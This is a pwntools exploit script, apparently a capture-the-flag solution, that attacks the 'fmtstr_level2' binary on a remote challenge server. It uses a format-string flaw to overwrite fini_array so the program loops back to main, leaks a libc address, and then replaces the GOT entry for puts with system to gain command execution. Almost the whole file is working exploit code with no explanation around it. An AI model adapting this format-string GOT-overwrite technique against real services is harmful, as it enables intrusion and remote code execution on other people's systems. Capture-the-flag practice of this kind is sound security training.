from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./fmtstr_level2")
io=remote("node2.anna.nssctf.cn",28540)
elf=ELF("./fmtstr_level2")
libc=ELF("./libc-2.31.so")

main=0x4011b6
fini_array=0x4031F0

io.recvuntil(b"ID\n")
payload=b"%38$paaa"+fmtstr_payload(7,{fini_array:main},numbwritten=0x11)
io.send(payload)

leak_addr=int(io.recv(14),16)-0x1f12e8
print("leak_addr: "+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b"system"]
payload=fmtstr_payload(6,{elf.got[b"puts"]:sys_addr})
io.send(payload)

io.interactive()